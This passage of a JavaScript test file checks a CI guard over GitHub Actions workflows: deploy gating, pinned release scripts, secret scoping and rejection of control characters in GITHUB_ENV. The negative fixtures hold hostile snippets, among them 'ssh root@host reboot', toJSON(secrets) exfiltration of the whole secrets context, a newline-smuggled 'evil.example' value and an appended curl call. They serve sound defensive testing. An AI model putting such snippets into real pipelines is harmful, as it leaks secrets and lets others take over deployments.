  expectFail('evil.yml', sneaky('echo hi\n      - uses: ./.github/actions/deploy'), /uses:\s*\.\//, 'local composite action');
  // 8. Another workflow declaring the production environment (any form/case) or an environment at all,
  //    and handing over the whole secrets context, then running an arbitrary script.
  const envJob = env => wf('  sneaky:\n    runs-on: ubuntu-24.04\n' + env + '    steps:\n      - run: scripts/remote-op.sh\n');
  for (const env of ['    environment: vps-production\n', '    environment: VPS-Production\n', '    environment: { name: vps-production }\n', '    environment:\n      name: VPS-PRODUCTION\n', '    environment: ${{ inputs.target }}\n']) {
    expectFail('evil.yml', envJob(env), /sneaky/, env.trim());
  }
  expectFail('evil.yml', wf("  sneaky:\n    runs-on: ubuntu-24.04\n    environment: vps-production\n    steps:\n      - run: scripts/remote-op.sh\n        env:\n          ALL: ${{ toJSON(secrets) }}\n"), /whole secrets context/, 'toJSON(secrets)');
  for (const expr of ['${{ toJSON(secrets) }}', '${{ tojson( secrets ) }}', "${{ secrets['VPS_SSH_PRIVATE_KEY'] }}", "${{ secrets[format('{0}', 'X')] }}", '${{ secrets }}']) {
    expectFail('evil.yml', sneaky('echo ' + expr), /secrets context/, expr);
    expectFail('deploy-vps.yml', deploy + '\n# ' + expr + '\n', /whole secrets context/, 'deploy-vps ' + expr);
  }
  // 9. check-app-compat is exempt only with --static.
  for (const args of ['--live https://example.com', '--live "$ORIGIN" --after', '--after', '', '--static --live https://example.com', '"$MODE" "$ORIGIN" # --static', '--static $X', '--static # x', '--static "--live"']) {
    expectFail('evil.yml', sneaky('node scripts/deploy/check-app-compat.mjs ' + args), /without exactly --static/, 'check-app-compat ' + args);
  }
  // Controls: the offline Node scripts ci.yml uses are allowed.
  assert.deepEqual(topologyViolations('evil.yml', sneaky('node scripts/deploy/check-app-compat.mjs --static')), []);
  // Extra jobs in deploy-vps.yml are refused.
  expectFail('deploy-vps.yml', deploy + '  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo\n', /exactly the jobs/, 'extra job');
});

test('parser is fail-closed: odd job ids and structures throw instead of hiding a job', () => {
  const wf = jobs => 'name: x\non: workflow_dispatch\njobs:\n' + jobs;
  for (const key of ['"sneaky":', "'sneaky':", 'sneaky : ', '? sneaky']) {
    assert.throws(() => splitWorkflow(wf('  ' + key + '\n    runs-on: ubuntu-24.04\n    steps:\n      - run: ssh root@host reboot\n')), /unrecognised job key/, key);
  }
  assert.throws(() => splitWorkflow(wf('  a:\n    runs-on: x\n  a:\n    runs-on: y\n')), /duplicate job id/);
  assert.throws(() => splitWorkflow('name: x\njobs: { a: { runs-on: x } }\n'), /plain "jobs:"/);
  assert.throws(() => splitWorkflow('name: x\non: push\n'), /plain "jobs:"/);
  assert.throws(() => jobProps('    "needs": ci-gate\n    runs-on: x'), /unrecognised job property/);
  assert.throws(() => jobProps('    needs: a\n    needs: ci-gate'), /duplicate job property/);
});

test('the retired one-off recovery workflow is gone and nothing references it', () => {
  assert.ok(!readdirSync(WORKFLOWS).includes('recover-vps-6270be9.yml'));
  for (const file of readdirSync(WORKFLOWS)) assert.doesNotMatch(readFileSync(join(WORKFLOWS, file), 'utf8'), /recover-vps-6270be9|recover-6270be9\.sh/, file);
});

test('deploy-vps.yml: ci-gate runs the gate on a resolved SHA and the deploy job checks out exactly that SHA', () => {
  const text = readFileSync(join(WORKFLOWS, 'deploy-vps.yml'), 'utf8');
  const jobs = jobsOf(text);
  assert.ok(jobs['ci-gate'] && jobs.deploy);
  assert.match(jobs['ci-gate'], /outputs:\s*\n\s+sha:\s*\$\{\{\s*steps\.source\.outputs\.sha\s*\}\}/);
  assert.match(jobs['ci-gate'], /node scripts\/deploy\/ci-gate\.mjs "\$DEPLOY_SHA"/);
  assert.ok(needsList(jobProps(jobs.deploy).needs ?? '').includes('ci-gate'), 'deploy must need ci-gate');
  assert.match(jobs.deploy, /uses:\s*actions\/checkout@v4\s*\n\s+with:\s*\n\s+ref:\s*\$\{\{\s*needs\.ci-gate\.outputs\.sha\s*\}\}/);
  assert.doesNotMatch(jobs.deploy, /ref:\s*main\b/);
});

// ---- main() exit codes via a local fake GitHub API ---------------------------------------------

const sha = n => String(n).repeat(40);
const ciRun = head => ({ status: 'completed', conclusion: 'success', event: 'push', head_branch: 'main', head_sha: head, path: '.github/workflows/ci.yml' });

async function withApi(handler, fn) {
  const server = http.createServer(handler);
  await new Promise(done => server.listen(0, '127.0.0.1', done));
  try { return await fn(`http://127.0.0.1:${server.address().port}`); } finally { await new Promise(done => server.close(done)); }
}

function runGate(api, args, cwd = ROOT) {
  return new Promise(done => {
    const child = spawn(process.execPath, [GATE, ...args], {
      cwd, env: { ...process.env, GITHUB_REPOSITORY: 'o/r', GITHUB_TOKEN: 't', GITHUB_API_URL: api },
    });
    let stderr = ''; let stdout = '';
    child.stderr.on('data', d => { stderr += d; });
    child.stdout.on('data', d => { stdout += d; });
    child.on('close', code => done({ code, stderr, stdout }));
  });
}

test('main(): a green CI run on the exact SHA exits 0 (positive control)', async () => {
  await withApi((req, res) => { res.setHeader('content-type', 'application/json'); res.end(JSON.stringify({ workflow_runs: [ciRun(sha('a'))] })); },
    async api => { const r = await runGate(api, [sha('a')]); assert.equal(r.code, 0, r.stderr); });
});

test('main(): HTTP 4xx/5xx from the GitHub API exits 1 (fail closed)', async () => {
  for (const status of [401, 403, 404, 429, 500, 503]) {
    await withApi((req, res) => { res.statusCode = status; res.end('{}'); }, async api => {
      const r = await runGate(api, [sha('a')]);
      assert.equal(r.code, 1, `HTTP ${status}`);
      assert.match(r.stderr, new RegExp(`GitHub API ${status}`));
    });
  }
});

test('main(): malformed JSON exits 1', async () => {
  await withApi((req, res) => { res.setHeader('content-type', 'application/json'); res.end('{not json'); }, async api => {
    assert.equal((await runGate(api, [sha('a')])).code, 1);
  });
});

test('main(): network failure (nothing listening) exits 1', async () => {
  const probe = http.createServer(); await new Promise(done => probe.listen(0, '127.0.0.1', done));
  const dead = `http://127.0.0.1:${probe.address().port}`; await new Promise(done => probe.close(done));
  assert.equal((await runGate(dead, [sha('a')])).code, 1);
});

test('main(): missing repo/token or malformed SHA exits 1', async () => {
  const bare = await new Promise(done => {
    const env = { ...process.env }; delete env.GITHUB_TOKEN; delete env.GITHUB_REPOSITORY;
    const c = spawn(process.execPath, [GATE, sha('a')], { env }); c.on('close', code => done(code));
  });
  assert.equal(bare, 1);
  await withApi((req, res) => res.end(JSON.stringify({ workflow_runs: [] })), async api => {
    assert.equal((await runGate(api, ['main'])).code, 1);
  });
});

test('main(): a response without workflow_runs is treated as no green CI (exit 1)', async () => {
  await withApi((req, res) => { res.setHeader('content-type', 'application/json'); res.end('{}'); }, async api => {
    assert.equal((await runGate(api, [sha('a')])).code, 1);
  });
});

// ---- merge commits / first-parent, against a real git repo ---------------------------------------

test('main(): bot-subject merge commit cannot smuggle code in through its second parent (first-parent walk + full diff)', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ci-gate-'));
  const git = (...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...a], { cwd: dir, encoding: 'utf8' }).trim();
  try {
    git('init', '-q', '-b', 'main');
    writeFileSync(join(dir, 'a.txt'), '1'); git('add', '.'); git('commit', '-q', '-m', 'feat: code');
    const green = git('rev-parse', 'HEAD');
    git('checkout', '-q', '-b', 'side');
    writeFileSync(join(dir, 'src.js'), 'evil'); git('add', '.'); git('commit', '-q', '-m', 'feat: side code');
    git('checkout', '-q', 'main');
    git('merge', '--no-ff', '-q', 'side', '-m', 'chore(progress): update docs/PROGRESS.md');
    const merge = git('rev-parse', 'HEAD');
    assert.equal(git('rev-parse', merge + '^1'), green);
    await withApi((req, res) => {
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ workflow_runs: req.url.includes(`head_sha=${green}`) ? [ciRun(green)] : [] }));
    }, async api => {
      const r = await runGate(api, [merge], dir);
      assert.equal(r.code, 1);
      assert.match(r.stderr, /src\.js/);
    });
    // Control: a bot commit that only touches docs/PROGRESS.md on top of the green commit passes.
    git('reset', '-q', '--hard', green);
    mkdirSync(join(dir, 'docs')); writeFileSync(join(dir, 'docs/PROGRESS.md'), 'x');
    git('add', 'docs/PROGRESS.md'); git('commit', '-q', '-m', 'chore(progress): update docs/PROGRESS.md');
    const bot = git('rev-parse', 'HEAD');
    await withApi((req, res) => {
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ workflow_runs: req.url.includes(`head_sha=${green}`) ? [ciRun(green)] : [] }));
    }, async api => { const r = await runGate(api, [bot], dir); assert.equal(r.code, 0, r.stderr); });
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('main(): a non-bot merge commit with no CI run of its own is refused even if its first parent is green', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ci-gate-'));
  const git = (...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...a], { cwd: dir, encoding: 'utf8' }).trim();
  try {
    git('init', '-q', '-b', 'main');
    writeFileSync(join(dir, 'a.txt'), '1'); git('add', '.'); git('commit', '-q', '-m', 'feat: code');
    const green = git('rev-parse', 'HEAD');
    git('checkout', '-q', '-b', 'side');
    writeFileSync(join(dir, 'b.txt'), '2'); git('add', '.'); git('commit', '-q', '-m', 'feat: side');
    git('checkout', '-q', 'main');
    git('merge', '--no-ff', '-q', 'side', '-m', "Merge branch 'side'");
    const merge = git('rev-parse', 'HEAD');
    await withApi((req, res) => {
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ workflow_runs: req.url.includes(`head_sha=${green}`) ? [ciRun(green)] : [] }));
    }, async api => { assert.equal((await runGate(api, [merge], dir)).code, 1); });
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- several runs on the same SHA --------------------------------------------------------------

test('multiple runs on one SHA: ANY success on the immutable SHA suffices, even if a newer run failed/was cancelled (documented behaviour)', async () => {
  // A SHA is immutable, so a green run proves that exact code passed CI. A later failed/cancelled
  // attempt (rerun, flaky infra) does not invalidate it. Changing this policy must be a conscious decision.
  const order = [
    [ciRun(sha('a')), { ...ciRun(sha('a')), conclusion: 'failure' }],
    [{ ...ciRun(sha('a')), conclusion: 'cancelled' }, ciRun(sha('a'))],
    [{ ...ciRun(sha('a')), conclusion: 'failure' }, { ...ciRun(sha('a')), conclusion: 'cancelled' }, ciRun(sha('a'))],
  ];
  for (const runs of order) {
    const r = await evaluateGate(sha('a'), { listCiRuns: async () => runs, subject: async () => 'feat', parent: async () => null, changedFiles: async () => [] });
    assert.deepEqual([r.ok, r.via], [true, 'direct']);
  }
  // Only non-success attempts: still refused.
  const none = await evaluateGate(sha('a'), { listCiRuns: async () => [{ ...ciRun(sha('a')), conclusion: 'failure' }, { ...ciRun(sha('a')), conclusion: 'cancelled' }], subject: async () => 'feat', parent: async () => null, changedFiles: async () => [] });
  assert.equal(none.ok, false);
});

// ---- STORE-01 PR-F: pinned release scripts and no control characters in GITHUB_ENV values ----------------
// The four repo scripts the release job runs are pinned by SHA-256 of their LF content (git stores LF; a Windows checkout may hold CRLF).
// Every release step that runs one checks the pin file FIRST, so a script changed without its pin fails that step (and this guard).
const PIN_FILE = 'mobile/release/script-pins.sha256';
// check-aab-release.py imports play_versioncode_gate.py, which runs inside the verify step, so it is pinned too (closure = direct scripts + imports).
const PINNED_SCRIPTS = ['mobile/tool/app-version.sh', 'mobile/tool/prepare-android.sh', 'mobile/tool/sign-aab.sh', 'mobile/tool/check-aab-release.py', 'mobile/tool/play_versioncode_gate.py', 'mobile/tool/prepare-ios.sh', 'mobile/tool/ios-testflight.sh'];
const PIN_CHECK = `sha256sum -c ${PIN_FILE}`;
const lfDigest = text => createHash('sha256').update(text.replace(/\r\n/g, '\n')).digest('hex');
const pinReal = () => readFileSync(join(ROOT, PIN_FILE), 'utf8');
const realScripts = () => Object.fromEntries(PINNED_SCRIPTS.map(p => [p, readFileSync(join(ROOT, p), 'utf8')]));

// Pure: the violations of the pin file against the given script contents (path -> text).
function scriptPinViolations(pinText, contents) {
  const out = [];
  const pins = new Map();
  for (const line of pinText.replace(/\r\n/g, '\n').split('\n')) {
    if (line === '') continue;
    const m = /^([0-9a-f]{64})  (\S+)$/.exec(line);
    if (!m) { out.push(`malformed pin line: ${line}`); continue; }
    pins.set(m[2], m[1]);
  }
  for (const path of PINNED_SCRIPTS) {
    if (!pins.has(path)) out.push(`${path} is not pinned`);
    else if (contents[path] === undefined) out.push(`${path} is missing`);
    else if (lfDigest(contents[path]) !== pins.get(path)) out.push(`${path} changed without its pin: update ${PIN_FILE} and the golden in the same change`);
  }
  for (const path of pins.keys()) if (!PINNED_SCRIPTS.includes(path)) out.push(`${path} is pinned but is not a release script`);
  return out;
}

test('script pins: the real release scripts match the pin file, and the golden mirrors the pin file', () => {
  assert.deepEqual(scriptPinViolations(pinReal(), realScripts()), []);
  // CRLF-tolerant like the digest check above: a Windows checkout may hold CRLF; the committed file is LF.
  const pinned = Object.fromEntries(pinReal().replace(/\r\n/g, '\n').trim().split('\n').map(line => { const [digest, path] = line.split('  '); return [path, digest]; }));
  assert.deepEqual(AAB_GOLDEN.scriptPins, pinned, 'golden.scriptPins equals the pin file');
});

test('script pins (negative): a script changed without its digest FAILS; the same bytes with CRLF are not a change', () => {
  const scripts = realScripts();
  const silent = { ...scripts, 'mobile/tool/sign-aab.sh': scripts['mobile/tool/sign-aab.sh'] + '\n# silent change\n' };
  const v = scriptPinViolations(pinReal(), silent);
  assert.equal(v.length, 1, JSON.stringify(v));
  assert.match(v[0], /mobile\/tool\/sign-aab\.sh changed without its pin/);
  assert.deepEqual(scriptPinViolations(pinReal(), { ...scripts, 'mobile/tool/sign-aab.sh': scripts['mobile/tool/sign-aab.sh'].replace(/\r?\n/g, '\r\n') }), []);
  assert.match(scriptPinViolations(pinReal(), { ...scripts, 'mobile/tool/check-aab-release.py': undefined }).join('\n'), /check-aab-release\.py is missing/);
  // a pin for a file that is not a release script is refused too
  assert.match(scriptPinViolations(pinReal() + 'a'.repeat(64) + '  mobile/tool/extra.sh\n', scripts).join('\n'), /extra\.sh is pinned but is not a release script/);
});

test('script pins (negative, import closure): a silent change to play_versioncode_gate.py (imported by check-aab-release.py) FAILS', () => {
  const scripts = realScripts();
  const v = scriptPinViolations(pinReal(), { ...scripts, 'mobile/tool/play_versioncode_gate.py': scripts['mobile/tool/play_versioncode_gate.py'] + '\n# silent change\n' });
  assert.equal(v.length, 1, JSON.stringify(v));
  assert.match(v[0], /mobile\/tool\/play_versioncode_gate\.py changed without its pin/);
});

test('script pins (closure): every local module that a pinned Python script imports is itself pinned', () => {
  const pinned = new Set(PINNED_SCRIPTS);
  for (const path of PINNED_SCRIPTS.filter(p => p.endsWith('.py'))) {
    const src = readFileSync(join(ROOT, path), 'utf8');
    for (const m of src.matchAll(/^(?:import|from) ([A-Za-z_][A-Za-z0-9_]*)/gm)) {
      const module = `mobile/tool/${m[1]}.py`;
      if (existsSync(join(ROOT, module))) assert.ok(pinned.has(module), `${path} imports ${module}, which is not pinned`);
    }
  }
});

test('script pins (workflow): each of the five steps that runs a pinned script checks the pin file before the script runs', () => {
  const steps = yaml.load(aabReal()).jobs.aab.steps;
  const callers = steps.filter(s => typeof s.run === 'string' && PINNED_SCRIPTS.some(p => s.run.includes(p)));
  assert.equal(callers.length, 5, callers.map(s => s.name).join(' | '));
  for (const step of callers) {
    const at = step.run.indexOf(PIN_CHECK);
    assert.ok(at >= 0, `${step.name}: pin check present`);
    const firstCall = Math.min(...PINNED_SCRIPTS.map(p => step.run.indexOf(p)).filter(i => i >= 0));
    assert.ok(at < firstCall, `${step.name}: the pin check comes before the script`);
  }
});

test('script pins (golden): removing the pin check from any step FAILS the golden', () => {
  const pinLine = aabReal().match(/^ +sha256sum -c mobile\/release\/script-pins\.sha256 \|\|.*$/m)[0];
  const without = aabReal().split(pinLine + '\n').join('');
  assert.ok(without.length < aabReal().length, 'the pin line exists');
  failsWith(AAB_FILE, without, GOLDEN_VIOLATION);
});

// Executes the REAL reject_ctl helper from the workflow (not a copy) on a value.
const rejectHelper = () => {
  const line = aabReal().split('\n').find(l => /^ +reject_ctl\(\) \{/.test(l));
  assert.ok(line, 'the workflow defines reject_ctl');
  return line.trim();
};
const runReject = value => spawnSync('bash', ['-c', `${rejectHelper()}\nreject_ctl VALUE "$VAL"`], { encoding: 'utf8', env: { ...process.env, VAL: value } });

test('GITHUB_ENV values: CR, LF and TAB are refused by the workflow helper; a clean value passes (executed, not copied)', () => {
  for (const bad of ['1.0.0\r', 'x\ny', 'a\rb', 'a\tb', 'https://api.example.com\nevil.example', '\n']) {
    const r = runReject(bad);
    assert.notEqual(r.status, 0, `refused: ${JSON.stringify(bad)}`);
    assert.match(r.stdout + r.stderr, /control character/);
  }
  const ok = runReject('https://api.example.com');
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
});

test('GITHUB_ENV values: every value written in the three public setup steps is checked BEFORE it is written', () => {
  const steps = yaml.load(aabReal()).jobs.aab.steps.filter(s => AAB_SETUP_ENV_STEPS.includes(s.name));
  assert.equal(steps.length, 3, 'the three public setup steps exist');
  let writes = 0;
  for (const step of steps) {
    const lines = step.run.split('\n');
    lines.forEach((line, i) => {
      const m = /echo "([A-Z_]+)=\$\{?([A-Za-z_]+)/.exec(line);
      if (!m) return;
      writes += 1;
      const [, envName, source] = m;
      const check = lines.findIndex(l => l.trim() === `reject_ctl ${envName} "$${source}"`);
      assert.ok(check >= 0 && check < i, `${step.name}: ${envName} is checked before it is written`);
    });
  }
  assert.equal(writes, 7, 'seven GITHUB_ENV values are scanned (source 1, identity 4, endpoints 2)');
});

test('GITHUB_ENV values (regression): the old endpoint regex alone accepted a value with an embedded newline (why reject_ctl exists)', () => {
  const re = /^https:\/\/[A-Za-z0-9.-]+(:[0-9]{1,5})?\/?$/m;
  // grep -E matches per line, so a second line smuggled into the value passed the old check.
  assert.ok(re.test('https://api.example.com\nevil.example'), 'the old check passes a value with a newline');
  assert.equal(runReject('https://api.example.com\nevil.example').status, 1, 'the new check refuses it');
});

// ---- iOS TestFlight release (G3): the exact pair passes; the usual ways to widen it fail -------------------------
const IOS_FILE = 'mobile-ios-release.yml';
const iosReal = () => readFileSync(join(WORKFLOWS, IOS_FILE), 'utf8').replace(/\r\n/g, '\n');
const iosMutate = (from, to) => {
  const text = iosReal();
  assert.ok(text.includes(from), `mutation anchor exists: ${from}`);
  return text.replace(from, to);
};

test('iOS release: the exact pair (mobile-ios-release.yml:testflight, ios-release, main, dispatch only) passes and matches the golden', () => {
  assert.deepEqual(topologyViolations(IOS_FILE, iosReal()), []);
  assert.deepEqual(canonicalSteps(yaml.load(iosReal()).jobs.testflight.steps), IOS_GOLDEN.steps);
  const pinned = Object.fromEntries(pinReal().replace(/\r\n/g, '\n').trim().split('\n').map(line => { const [digest, path] = line.split('  '); return [path, digest]; }));
  assert.deepEqual(IOS_GOLDEN.scriptPins, pinned, 'golden.scriptPins equals the pin file');
});

test('iOS release (negative): another file name, job, environment, trigger, ref or runner is refused', () => {
  for (const name of ['mobile-ios-release.yaml', 'mobile-ios-release-copy.yml', 'Mobile-iOS-Release.yml']) failsWith(name, iosReal(), /declares an environment/);
  failsWith(IOS_FILE, iosMutate('\n  testflight:\n', '\n  release:\n'), /must have exactly the job testflight/);
  failsWith(IOS_FILE, iosMutate('environment: ios-release', 'environment: vps-production'), /environment must be exactly ios-release|vps-production/);
  failsWith(IOS_FILE, iosMutate('on:\n  workflow_dispatch:', 'on:\n  push:\n  workflow_dispatch:'), /only trigger is workflow_dispatch/);
  failsWith(IOS_FILE, iosMutate("    if: github.ref == 'refs/heads/main'", "    if: always()"), /restricted to/);
  failsWith(IOS_FILE, iosMutate('runs-on: macos-26', 'runs-on: [self-hosted]'), /runs-on must be macos-26|self-hosted/);
  failsWith(IOS_FILE, iosMutate('permissions:\n  contents: read', 'permissions:\n  contents: write'), /permissions must be exactly contents: read/);
});

test('iOS release (negative): an unpinned action, a changed step, a leaked key or a foreign secret is refused', () => {
  failsWith(IOS_FILE, iosMutate('actions/checkout@11d5960a326750d5838078e36cf38b85af677262', 'actions/checkout@v4'), /is not an allowed action/);
  failsWith(IOS_FILE, iosReal().replace('\n    steps:\n', '\n    steps:\n      - uses: actions/cache@0123456789abcdef0123456789abcdef01234567\n'), /is not an allowed action/);
  failsWith(IOS_FILE, iosMutate('bash mobile/tool/ios-testflight.sh "${{ inputs.app }}"', 'bash mobile/tool/ios-testflight.sh "${{ inputs.app }}" --verbose'), /differ from the approved golden/);
  failsWith(IOS_FILE, iosMutate('IOS_ASC_KEY_ID: ${{ vars.IOS_ASC_KEY_ID }}', 'IOS_ASC_KEY_ID: ${{ vars.IOS_ASC_KEY_ID }}\n          X: ${{ secrets.ANDROID_UPLOAD_KEYSTORE_BASE64 }}'), /secret not allowed in the release job/);
  failsWith(IOS_FILE, iosMutate('FCM_API_KEY: ${{ inputs.app', 'FCM_API_KEY: ${{ secrets.IOS_ASC_KEY_P8_BASE64 }} ${{ inputs.app'), /secret IOS_ASC_KEY_P8_BASE64 outside its step/);
  failsWith(IOS_FILE, iosMutate('echo "SOURCE_SHA=$actual" >> "$GITHUB_ENV"', 'echo "SOURCE_SHA=$actual" >> "$GITHUB_ENV"; curl https://example.com'), /forbidden command|contact any URL/);
});

test('iOS release: no other workflow names the iOS release environment or its API key', () => {
  for (const file of readdirSync(WORKFLOWS)) {
    if (file === IOS_FILE) continue;
    const text = readFileSync(join(WORKFLOWS, file), 'utf8');
    assert.doesNotMatch(text, /IOS_ASC_|ios-release/, `${file} must not name the iOS release key or environment`);
  }
});
